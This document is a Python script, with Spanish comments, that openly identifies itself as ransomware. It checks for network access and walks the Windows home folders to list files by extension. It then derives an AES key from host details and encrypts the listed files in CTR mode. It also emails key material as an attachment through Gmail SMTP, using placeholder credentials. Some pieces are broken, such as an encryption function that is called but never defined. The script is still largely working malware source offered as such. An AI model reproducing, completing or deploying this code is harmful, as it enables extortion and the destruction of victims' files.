#!/usr/bin/python3 
#-*- coding: utf-8 -*-

import socket
import os
import random
import hashlib
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from Crypto.Util import Counter
from Crypto.Cipher import AES



carpetasn = [] 
extensiones = ['.ish'] # Aqui van las extensiones por las cuales filtra todo y cada uno de los archivos eh despues los escribe en un archivo el cual contiene la ruta absoluta lo cual recorremos eh encriptamos todo 

home = os.environ['HOMEPATH']
carpetas = os.listdir(home)
for n in carpetas:
    if n[0] == ".":
        pass
    elif ".DAT" in n:
        pass
    elif ".dat" in n:
        pass
    elif ".txt" in n:
        pass
    else:
        carpetasn.append(n)
def connection_check():
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.settimeout(2)
    try:
        sock.connect(('sock.io',80))
        sock.close()
    except:
        print("No Hay Conexion")
        exit()
def SendMail():
    remitente = 'CORREO'
    destinatarios = ['CORREO']
    asunto = 'Ransomware Key'
    cuerpo = 'Ransomware Ejecutado Con exito!'
    ruta_adjunto = 'private.pem'
    nombre_adjunto = 'private.pem'
    mensaje = MIMEMultipart()
 
    mensaje['From'] = remitente
    mensaje['To'] = ", ".join(destinatarios)
    mensaje['Subject'] = asunto
 
    mensaje.attach(MIMEText(cuerpo, 'plain'))
    archivo_adjunto = open(ruta_adjunto, 'rb')
    adjunto_MIME = MIMEBase('application', 'octet-stream')
    adjunto_MIME.set_payload((archivo_adjunto).read())
    encoders.encode_base64(adjunto_MIME)
    adjunto_MIME.add_header('Content-Disposition', "attachment; filename= %s" % nombre_adjunto)
    mensaje.attach(adjunto_MIME)
    sesion_smtp = smtplib.SMTP('smtp.gmail.com', 587)
    sesion_smtp.starttls()
    sesion_smtp.login('CORREO','PASSWORD')
    texto = mensaje.as_string()
    sesion_smtp.sendmail(remitente, destinatarios, texto)
    sesion_smtp.quit()  

def Discover(key):
     i = open('file_list','w+')
     for carpeta in carpetasn:
        ruta =  'c:\\' + home + '/%s' % (carpeta)
        for extension in extensiones:
            for RutaABS, Directorio, Archivo in os.walk(ruta):
                for file in Archivo:
                    if extension in file:
                        i.write(os.path.join(RutaABS, file)+'\n')
        
     i.close()
     lista = open('file_list','r')
     lista = lista.read().split('\n')
     listan = []
     for n in lista:
         if n == "":
             pass
         else:
             listan.append(n)
     else:
         c = Counter.new(128)
         crypto = AES.new(key,AES.MODE_CTR,counter=c)
         key_file = open('key_file','w+')
         key_file.write(key)
         key_file.close()
         SendMail()
         os.system("del key_file") 
         cryptoarchives = crypto.encrypt
         for archivoi in listan:
             Encrypt_And_Decrypt(archivoi,cryptoarchives)

def get_hash():
    hashcomputer = os.environ['HOMEPATH'] + os.environ['USERNAME'] + socket.gethostname() + str(random.randint(0,100000000000000000000000000000000000000000000000000000000000000))
    hashcomputer = hashcomputer.encode('utf8')
    hashcomputer = hashlib.sha512(hashcomputer)
    hashcomputer = hashcomputer.hexdigest()
    
    newkey = []
    len(hashcomputer)
    for k in hashcomputer:
        if len(newkey) == 32:
            hashcomputer = ''.join(newkey)
            break
        else:
            newkey.append(k)
    return hashcomputer
def main():
    connection_check()
    hashc = get_hash()
    try:
        Discover(hashc)
    except UnicodeEncodeError:
        print("")
    
    

   
if __name__ == '__main__':
    main()
